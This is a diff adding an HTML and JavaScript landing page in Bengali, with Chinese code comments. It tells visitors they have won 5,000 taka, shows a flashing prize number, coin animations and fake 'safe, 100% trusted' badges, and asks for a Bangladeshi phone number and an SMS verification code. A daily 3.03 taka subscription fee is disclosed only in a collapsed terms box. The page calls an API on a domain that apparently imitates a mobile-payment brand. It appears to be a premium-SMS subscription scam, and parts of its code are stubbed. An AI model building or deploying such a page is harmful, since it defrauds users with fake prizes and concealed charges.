@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফ্রি স্পিন – বড় পুরস্কার জিতুন</title>
+    <style>
+                    html, body {
+                                display: flex;
+                                justify-content: center;  /* 水平居中 */
+                                align-items: center;      /* 垂直居中 */
+                                width: 100%;
+                                height: 100%;
+                                margin: 0;  /* 去掉默认边距 */
+                                padding: 0;
+                                background-color: black;
+                             }
+                             h1, h2, h3, h4, h5, h6 {
+                              margin: 0;    /* 去掉所有标题的默认边距 */
+                              padding: 0;
+                           }
+                    .card {
+                                
+                                display: flex;
+                                flex-direction: column;
+                                justify-content: center;
+                                align-items: center; 
+                                max-width: 440px;       /* ← 最大宽度限制 */
+                                width: 95%;            /* ← 宽度自适应 */
+                                max-height: 98vh;       /* ← 最大高度限制 */
+                                background: rgb(250, 249, 249); 
+                                border-radius: 32px; 
+                                overflow-y: visible; 
+                                overflow: hidden;   
+                                /* position: relative; */
+                        }
+                        
+                     
+                        .content1 {
+                                display: flex;
+                                flex-direction: column;
+                                justify-content: center;
+                                align-items: center;
+                                padding: 16px;
+                                color: white;
+                                background-color: #3A7CAE;
+                                width: 100%;  
+                                border-radius: 32px 32px 0 0; 
+
+                        }
+                        .content2 {
+                                display: flex;
+                                flex-direction: column;
+                                align-items: center;
+                                padding: 16px;
+                                color: rgb(243, 242, 242);
+                        }
+                        .content3 {
+                                display: flex;
+                                flex-direction: column;
+                                align-items: center;
+                                padding: 16px;
+                                color: white;
+                        }
+                        .content4 {
+                                display: flex;
+                                flex-direction: column;
+                                align-items: center;
+                                padding: 16px;
+                                color: white;
+                        }
+                       .prize {
+                                    display: flex;
+                                    background: #fff;           /* 白色背景（在红色卡片上很醒目） */
+                                    border: 2px solid #e2e8f0;  /* 浅灰色边框 */
+                                    border-radius: 20px;        /* 圆角 */
+                                    padding: 20px 16px;         /* 内边距（上下20px，左右16px） */
+                                    width: 100%;                /* 占满父容器宽度 */
+                                    justify-content: center;
+                                    margin-bottom: 15px;        /* 和按钮之间留空 */
+                                    box-shadow: 0 4px 6px rgba(0,0,0,0.05); /* 轻微阴影（可选） */
+                                    gap: 4px;  
+                                    flex-wrap: wrap  
+                        }
+                        #prizeCopy {
+                                       color: #e67e22;            /* 橙色，醒目 */
+                                       font-size: 22px;
+                                       font-weight: bold;
+                                    }
+                        .button1 {
+                                width: 100%;
+                                height: 48px;
+                                background-color: #4CAF50; /* 绿色背景 */
+                                color: white; /* 白色文字 */
+                                border: none; /* 去掉边框 */
+                                border-radius: 16px; /* 圆角 */
+                                cursor: pointer; /* 鼠标悬停时显示为手型 */
+                                font-size: 20px; /* 字体大小 */
+                        }
+
+                        .sp0, .sp1, .sp2, .sp3{
+                            color: #e67e22;
+                            font-weight: bold;
+                            font-size: 12px;
+                        }
+                        .sp4{
+                            color: #e67e22;
+                            font-weight: bold;
+                            font-size: 10px;
+                        }
+                        .spx {
+                            color: #e67e22;
+                            font-weight: bold;
+                        }
+                        #ExplanationofTerms2, #ExplanationofTerms1 {
+                                     color: #e67e22;
+                                     font-weight: bold;
+                        }
+                       
+                        .tnc-content1, .tnc-content2 {
+                                   color: #e67e22;
+                                     font-weight: bold;
+                        }
+                        /* 内容默认隐藏 */
+                        .tnc-content {
+                        display: none;
+                        
+                        }
+
+                        /* 内容显示 */
+                        .tnc-content.open {
+                        display: block;
+                        }
+
+                        /* 箭头旋转 */
+                        .spx {
+                        display: inline-block;
+                        transition: transform 0.3s ease;
+                        }
+                        .spx.open {
+                        transform: rotate(180deg);
+                        }
+                        #terms{
+                               color:#e67e22;
+                        }
+                     
+                    #phoneSection {
+                                display: flex;
+                                justify-content: center;  /* 水平居中 */
+                                align-items: center;      /* 垂直居中 */
+                                position: absolute;
+                                flex-direction: column;
+                                top: 50%;
+                                left: 50%;
+                                transform: translate(-50%, -50%);
+                               
+                                width: 95%;
+                                max-width: 500px;
+                                background: rgb(250, 249, 249);
+                                border-radius: 32px;
+                                z-index: 10;
+                                overflow: hidden; 
+                                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                               
+                            }
+                          #phoneSection.hidden{
+                              display: none !important;
+                          }
+
+                    .hidden {
+                        display: none ;
+                    }
+                  
+                    .iphone {                        
+                        width: 100%;
+                        height: 100%;
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                        background-color: #3A7CAE;
+                        border-radius: 32px 32px 0 0;
+                        text-align: center;
+                        padding: 20px;
+                    }
+                .iphone1 {
+                     width: 100%;
+                        height: 100%;
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                        padding: 16px 5px 0 5px;
+                }
+                .iphone2 {
+                     width: 100%;
+                        height: 100%;
+                        display: flex;
+                        flex-direction: row;
+                        justify-content: center;
+                        align-items: center;
+                        padding: 16px;
+                        
+                        overflow: hidden;
+                        
+                }
+                .huoquyanzhengma {
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        width: 90%;        /* 宽度占满父容器 */
+                        height: 48px;       /* 高度 48px */
+                        font-size: 16px;    /* 文字大小 16px */
+                        border-radius: 16px;/* 圆角 16px */
+                        background: #4CAF50;/* 绿色背景 */
+                        color: white;       /* 白色文字 */
+                        border: none;       /* 无边框 */
+                        cursor: pointer;    /* 手型指针 */
+                        padding: 16px;
+                        font-size: 20px;
+                       
+}
+                 #verificationCodeSection {
+                   
+                                display: flex;
+                                justify-content: center;  /* 水平居中 */
+                                align-items: center;      /* 垂直居中 */
+                                position: absolute;
+                                flex-direction: column;
+                                top: 50%;
+                                left: 50%;
+                                transform: translate(-50%, -50%);                               
+                                width: 95%;
+                                max-width: 400px;
+                                background: rgb(250, 249, 249);
+                                border-radius: 32px;
+                                z-index: 10;                              
+                                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                                overflow: hidden;
+                }
+                #verificationCodeSection.hidden{
+                              display: none !important;
+                              
+                          }
+                          .yanzhengma_content{
+                              text-align: center;
+                              background-color: #3A7CAE;
+                              border-radius: 32px 32px 0 0;
+                              height: 100%;
+                              width: 100%;
+                              display: flex;
+                              flex-direction: column;
+                              justify-content: center;
+                              align-items: center;
+                              padding: 15px;
+
+                          }
+                          .yanzhengma_content2{
+                              text-align: center;                                                            
+                              height: 100%;
+                              width: 100%;
+                              display: flex;
+                              flex-direction: column;
+                              justify-content: center;
+                              align-items: center;
+                              padding: 15px;
+                          }
+                          .yanzhengma_content2{
+                              text-align: center;                                                            
+                              height: 100%;
+                              width: 100%;
+                              display: flex;
+                              flex-direction: row;
+                              justify-content: center;
+                              align-items: center;
+                              padding: 15px;
+                          }
+                          .yanzhengma_content4{
+                              text-align: center;
+                              height: 100%;
+                              width: 100%;
+                              display: flex;
+                              flex-direction: column;
+                              justify-content: center;
+                              align-items: center;
+                              padding: 15px 0 0 0;
+                          }
+                          .tijiaoanniu{
+                            width: 80%;        /* 宽度占满父容器 */
+                            height: 48px;   
+                                /* 高度 48px */
+                            border-radius: 16px; /* 圆角 */
+                            background-color: #4CAF50;
+                            border: none;
+                            color: white;
+                            font-size: 20px;
+                          }
+                            .yanzhengma_content5{
+                                text-align: center;
+                                height: 100%;
+                                min-height: 48px;
+                                width: 100%;
+                                display: flex;
+                                flex-direction: row;
+                                justify-content: center;
+                                align-items: center;
+                                color: #e67e22;
+                                
+                            }
+                          .yanzhengma_content6{
+                              display: none;
+                          }
+                          .yanzhengma_content6.hidden {
+                              display: block;
+                              
+                          }
+                          #sanjiao{
+                            display: inline-block;
+                            transition: transform 0.3s ease;
+                          }
+                          #sanjiao.open {
+                            transform: rotate(180deg);  /* 旋转 180 度 */
+                            }
+                            /* 弹窗背景遮罩 */
+                            .modal-overlay {
+                                display: none;
+                                position: fixed;
+                                top: 0;
+                                /* left: 0; */
+                                width: 95%;
+                                height: 100%;
+                                background: rgba(0, 0, 0, 0.6);
+                                z-index: 9999;
+                                justify-content: center;
+                                align-items: center;
+                            }
+                            .modal-overlay.show {
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                            }
+
+                            /* 弹窗内容 */
+                            .modal-box {
+                                background: white;
+                                border-radius: 24px;
+                                padding: 40px 32px 32px;
+                                max-width: 340px;
+                                width: 90%;
+                                text-align: center;
+                                box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+                                animation: modalFadeIn 0.3s ease;
+                            }
+
+                            /* 弹窗图标 */
+                            .modal-icon {
+                                font-size: 56px;
+                                margin-bottom: 12px;
+                            }
+
+                            /* 弹窗标题 */
+                            .modal-title {
+                                font-size: 22px;
+                                font-weight: 700;
+                                color: #e67e22;
+                                margin-bottom: 8px;
+                            }
+
+                            /* 弹窗描述 */
+                            .modal-desc {
+                                font-size: 20px;
+                                color: #e67e22;
+                                margin-bottom: 24px;
+                            }
+
+                            /* 弹窗按钮 */
+                            .modal-btn {
+                                width: 100%;
+                                padding: 14px;
+                                background: #4CAF50;
+                                color: white;
+                                border: none;
+                                border-radius: 16px;
+                                font-size: 16px;
+                                font-weight: 600;
+                                cursor: pointer;
+                                transition: transform 0.2s;
+                            }
+                            .modal-btn:active {
+                                transform: scale(0.96);
+                            }
+
+                            /* 弹窗动画 */
+                            @keyframes modalFadeIn {
+                                from {
+                                    opacity: 0;
+                                    transform: scale(0.9) translateY(-20px);
+                                }
+                                to {
+                                    opacity: 1;
+                                    transform: scale(1) translateY(0);
+                                }
+                            }
+                            #rollingNumber{
+                                color: #e67e22;            /* 橙色，醒目 */
+                                font-size: 22px;
+                                font-weight: bold;
+                                
+                                
+                            }
+                            #subtitle2{
+                                color: #e67e22;            /* 橙色，醒目 */
+                                font-size: 22px;
+                                font-weight: bold;
+                                
+                                
+                            }
+                            .free{
+                                    color: #e67e22;            /* 橙色，醒目 */
+                                    font-size: 22px;
+                                    font-weight: bold;
+                                
+                                
+                            }
+                            .freefree{
+                                    color: #22a8e6;            /* 橙色，醒目 */
+                                    font-size: 22px;
+                                    font-weight: bold;
+                            }
+                            .free_{
+                                    color:  #e67e22;            /* 橙色，醒目 */
+                                    font-size: 22px;
+                                    font-weight: bold;
+                            }
+                            .free__{
+                                color:  #e67e22; 
+                                text-align: center;
+                                width: 100%;   /* 让 span 占满整行，文字才能居中 */
+                                padding: 0 30px; 
+                                
+                            }
+                            .sp11{
+                            color: #e67e22;
+                            font-weight: bold;
+                            font-size: 12px;
+                            padding: 16px;
+                        }
+                        .phone-prefix{
+                                   font-weight: bold;
+                        }
+                        .yanzhengmawenan{
+                            font-size: 20px;
+                            font-weight: 700;
+                            color: #e67e22;
+                        }
+                        @keyframes fall {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                /* 飘到屏幕下方 100vh 外，并旋转 2 圈 */
+                transform: translateY(calc(100vh + 100px)) rotate(720deg);
+                opacity: 0.2;
+            }
+        }
+        .coin {
+            position: fixed;     /* 固定在视口上 */
+            top: -50px;          /* 从顶部外面开始 */
+            font-size: 30px;     /* 默认大小 */
+            pointer-events: none; /* 让点击穿透，不影响点击按钮 */
+            z-index: 999;
+            /* 动画名称 执行时间 匀速 保持结束状态 */
+            animation: fall linear forwards;
+        }
+    </style>
+</head>
+<body>
+       <div id="customModal2" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-icon">❌</div>
+        <h2 class="modal-title">জমা দেওয়া ব্যর্থ হয়েছে।!</h2>
+        <p class="modal-desc">আপনার যাচাইকরণ কোডটি যাচাইকরণে ব্যর্থ হয়েছে।</p>
+        <button class="modal-btn" onclick="closeModal2()">অনুগ্রহ করে এটি আবার পূরণ করুন।</button>
+    </div>
+</div>
+   <div id="customModal" class="modal-overlay">
+    <div class="modal-box">
+        <div class="modal-icon">✅</div>
+        <h2 class="modal-title">জমা দেওয়া সফল হয়েছে!</h2>
+        <p class="modal-desc">পুরস্কার বিতরণ করা হতে চলেছে।</p>
+        <button class="modal-btn" onclick="closeModal()">ঠিক আছে</button>
+    </div>
+</div>
+   <div id="verificationCodeSection" class="hidden">
+    <div class="yanzhengma_content"><span class="yanzhengmawenan">🔑ভেরিফিকেশন কোড দিন </span></div>
+    <div class="yanzhengma_content2"><span class="yanzhengmawenan">আপনার মোবাইলের SMS দেখুন<br>৫-অঙ্কের কোড দিন </span></div>
+    <div class="yanzhengma_content3"></div>
+    <div class="yanzhengma_content4"><button class="tijiaoanniu" onclick="submitForm(xxx)">✅পুরস্কার নিন</button></div>
+    <div class="yanzhengma_content5" onclick='toggleTnc2()'>শর্তাবলি<span id="sanjiao">▼</span></div>
+    <div class="yanzhengma_content6" >
+                        <p class="tnc-content1">💰 订阅费用: ৩.০৩ টাকা/দিন</p>
+                        <p class="tnc-content2">📱 取消方式: 12500 নম্বরে UNSUBE</p>
+    </div>
+   </div>
+   <div id="phoneSection" class="hidden" >
+        <div class="iphone">
+            <h1 class="free_">🎉 অভিনন্দন! 🎉</h1>
+            <h2 class="free_">🎊 আপনি জিতেছেন ৫,০০০ টাকা পুরস্কার! 🎊</h2>
+        </div>
+        <div class="iphone1">
+            <span class="free__">📱 আপনার মোবাইল নম্বর দিন একটি <br>OTP SMS আপনার নম্বরে পাঠানো হবে</span>
+
+        </div>
+         <div class="iphone2">
+          <span class="phone-prefix">+88</span><div id="phoneInputsContainer"></div>          
+        </div>
+       
+            <button class="huoquyanzhengma">📨 ভেরিফিকেশন কোড পাঠান</button>
+        
+        <div style="display: flex; gap: 80px; justify-content: center;">
+            
+    <span class="sp11">🔒 নিরাপদ | ✅ ১০০% বিশ্বস্ত</span>
+    
+</div>
+   </div>
+   <div class="card">
+      
+     
+         <div class="content1">
+                     <h1 id="subtitle2">🎉 ফ্রি স্পিন 🎉</h1>
+                     <h2 id="subtitle2">আজকের ভাগ্যবানব্যবহারকারী!</h2>
+            </div>
+            <div class="content2">
+               <div class="prize">
+                  <span id="prizeCopy" class="prizeDisplay">আপনার</span><span class="freefree">বিনামূল্যে</span><span id="rollingNumber">৫,০০০</span><br><span class="free">টাকা</span><span  class="free">জেতার</span><span  class="free">সুযোগ</span><span  class="free">রয়েছে!</span>
+               </div>
+               <button   class="button1"  onclick="qiehuan1()" >🎯পুরস্কার নিন</button>
+            </div>
+            <div class="content3">
+                 <h5 id="ExplanationofTerms1" >✅ সাবস্ক্রাইব → পুরস্কার গ্রহণ</h5>
+                 <h5 id="ExplanationofTerms2" >🎁 পুরস্কার হিসেবে মোবাইল রিচার্জ</h5>
+                 <div id="zhedie" onclick="toggleTnc()">
+                   <span id="terms">শর্তাবলি</span>
+                   <span class="spx" id="arrowIcon">▼</span>                                      
+                 </div>
+                 <div class="tnc-content" id="tncContent">
+                        <p class="tnc-content1">💰 订阅费用: ৩.০৩ টাকা/দিন</p>
+                        <p class="tnc-content2">📱 取消方式: 12500 নম্বরে UNSUBE</p>
+                  </div>
+            </div>
+            <div class="content4">
+                 <div>
+                  <span class="sp1">🔒 <strong>নিরাপদ </strong></span>
+                  <span class="sp2">✅ <strong>১০০% বিশ্বস্ত</strong></span>
+                  <span class="sp3">🏆 বাস্তব পুরস্কার</span>
+                 </div>
+                 <div>
+                  <span class="sp4">সীমিত সময়ের অফার</span>
+                 </div>
+            </div>
+      
+            
+            
+   </div>
+   <script>
+    var xxx= 0;
+    var API_BASE_URL = "https://api.bkashofferhub.top";  // 替换为实际的 API 基础 URL
+    function toggleTnc() {
+    var content = document.getElementById('tncContent');
+    var arrow = document.getElementById('arrowIcon');  // 给箭头加个 id
+    
+    content.classList.toggle('open');   // 切换内容的显示
+    arrow.classList.toggle('open');     // 切换箭头的旋转
+};
+        function gundong(){
+        var arr = ["৫,০০০", "৩,০০০", "২,০০০", "১,০০০"];
+        
+        setInterval(function(){
+                var arr_random = Math.floor(Math.random()*arr.length);
+             arr_num = arr[arr_random];
+             document.getElementById("rollingNumber").innerHTML = arr_num;
+        }, 50);
+        };
+        gundong()
+        document.querySelector('.button1').addEventListener('click', function() {
+            document.getElementById("phoneSection").classList.toggle("hidden");
+        });
+        function  qiehuan1() {
+            document.getElementsByClassName('card')[0].classList.toggle("hidden");
+            piaoQian()
+            setTimeout(() => {
+        document.getElementById('phone-0').focus();
+    }, 150);
+        }
+        const phoneGroup = document.querySelector('#phoneInputsContainer');  // 取第一个 .phoneInputsContainer
+
+       for (let i = 0; i < 10; i++) {
+           const input = document.createElement('input');
+           input.type = 'text';
+           input.inputMode = 'numeric';
+           input.maxLength = 1;
+           input.id = `phone-${i}`;
+           input.dataset.index = i;
+           input.style.width = '24px';
+        input.style.height = '36px';
+        input.style.textAlign = 'center';
+        input.style.fontSize = '16px';
+        input.style.fontWeight = '600';
+        input.style.border = '2px solid #e2e8f0';
+        input.style.borderRadius = '8px';
+        input.style.outline = 'none';
+        input.style.background = '#f8fafc';
+        input.style.color = '#1e293b';
+        input.style.border = '2px solid #e67e22';
+        input.addEventListener('input', function() {
+        // 只保留数字
+        this.value = this.value.replace(/\D/g, '');
+        
+        // 如果有值，跳到下一个输入框
+        if (this.value) {
+            const nextIndex = parseInt(this.dataset.index) + 1;
+            if (nextIndex < 11) {
+                const next = document.getElementById(`phone-${nextIndex}`);
+                if (next) next.focus();
+            }
+        }
+    });
+        input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value) {
+            const prevIndex = parseInt(this.dataset.index) - 1;
+            if (prevIndex >= 0) {
+                const prev = document.getElementById(`phone-${prevIndex}`);
+                if (prev) {
+                    prev.focus();
+                    prev.value = '';
+                }
+            }
+        }
+    });
+           // 添加到容器
+           phoneGroup.appendChild(input);
+       }
+       
+       document.getElementById('phone-0').focus();
+       
+            huoquyanzhengma = document.querySelector('.huoquyanzhengma');
+            huoquyanzhengma.addEventListener('click', async function() {
+          
+          document.getElementById('phoneSection').classList.add('hidden');
+          document.getElementById('verificationCodeSection').classList.remove('hidden');
+          document.getElementById('yanzhengma-0').focus();
+          const url1 = API_BASE_URL + "/api/pin/request";
+          const res = await fetch(url1);
+          const data = await res.json();
+          console.log(data);
+       })
+    const yanzhengmaInputs = document.querySelectorAll('.yanzhengma_content3');
+    for (let i = 0; i < 5; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.inputMode = 'numeric';
+        input.maxLength = 1;
+        input.id = `yanzhengma-${i}`;
+        input.dataset.index = i;
+        input.style.width = '24px';
+        input.style.height = '36px';
+        input.style.textAlign = 'center';
+        input.style.fontSize = '16px';
+        input.style.fontWeight = '600';
+        input.style.border = '2px solid #e2e8f0';
+        input.style.borderRadius = '8px';
+        input.style.outline = 'none';
+        input.style.background = '#f8fafc';
+        input.style.color = '#1e293b';
+        input.style.border = '2px solid #e67e22';
+        input.addEventListener('input', function() {
+        // 只保留数字
+        this.value = this.value.replace(/\D/g, '');
+        
+        // 如果有值，跳到下一个输入框
+        if (this.value) {
+            const nextIndex = parseInt(this.dataset.index) + 1;
+            if (nextIndex < 5) {
+                const next = document.getElementById(`yanzhengma-${nextIndex}`);
+                if (next) next.focus();
+            }
+        }
+    });
+       input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value) {
+            const prevIndex = parseInt(this.dataset.index) - 1;
+            if (prevIndex >= 0) {
+                const prev = document.getElementById(`yanzhengma-${prevIndex}`);
+                if (prev) {
+                    prev.focus();
+                    prev.value = '';
+                }
+            }
+        }
+    });
+        document.querySelector('.yanzhengma_content3').appendChild(input);
+    }
+    function toggleTnc2() {
+      document.querySelector('.yanzhengma_content6').classList.toggle('hidden');
+        document.getElementById('sanjiao').classList.toggle('open');
+    }
+    function submitForm(xxx){
+        if(xxx){document.getElementById('customModal').classList.add('show');}else{document.getElementById('customModal2').classList.add('show')}
+        
+        
+    }
+    function closeModal() {
+        // document.getElementById('customModal').classList.remove('show');
+        // window.close();
+    }
+    function closeModal2() {
+        document.getElementById('customModal2').classList.remove('show');
+        document.getElementById('verificationCodeSection').classList.add('hidden');
+        document.getElementById('phoneSection').classList.remove('hidden');
+    }
+    function piaoQian() {
+            // 可选：禁用按钮，防止疯狂点击叠加（可加可不加）
+            // btn.disabled = true;
+
+            // 存放不同钱币样式的数组
+            const coins = ['💰', '💵', '💸'];
+            
+            let count = 0;
+            const maxCoins = 80; // 总共掉 50 个
+
+            // 1. 开启定时器，每 100 毫秒掉一个
+            const timer = setInterval(() => {
+                // 2. 创建一个新的 span 元素
+                const coin = document.createElement('span');
+                coin.className = 'coin';
+
+                // 3. 随机选一个钱币符号
+                const randomIndex = Math.floor(Math.random() * coins.length);
+                coin.textContent = coins[randomIndex];
+
+                // 4. 随机水平位置 (0% ~ 100%)
+                coin.style.left = Math.random() * 100 + 'vw';
+
+                // 5. 随机大小 (20px ~ 50px)
+                const size = 20 + Math.random() * 30;
+                coin.style.fontSize = size + 'px';
+
+                // 6. 随机飘落速度 (2秒 ~ 5秒)
+                const duration = 2 + Math.random() * 3;
+                coin.style.animationDuration = duration + 's';
+
+                // 7. 随机微小延迟 (0 ~ 0.5秒)，让飘落错落有致
+                coin.style.animationDelay = Math.random() * 0.5 + 's';
+
+                // 8. 把钱币放到页面中
+                document.body.appendChild(coin);
+
+                // 9. 钱币飘完自动删除 (防止页面卡顿)
+                //    总时长 = 动画时长 + 延迟时长 + 缓冲
+                const totalTime = (duration + 0.5) * 1000;
+                setTimeout(() => {
+                    if (coin.parentNode) {
+                        coin.remove();
+                    }
+                }, totalTime);
+
+                count++;
+
+                // 10. 掉够 50 个，停止定时器
+                if (count >= maxCoins) {
+                    clearInterval(timer);
+                    // btn.disabled = false; // 如果禁用了按钮，在这里解锁
+                }
+            }, 20); // 80毫秒掉一个，50个大约4秒掉完
+        }
+   </script>
+</body>
+</html>
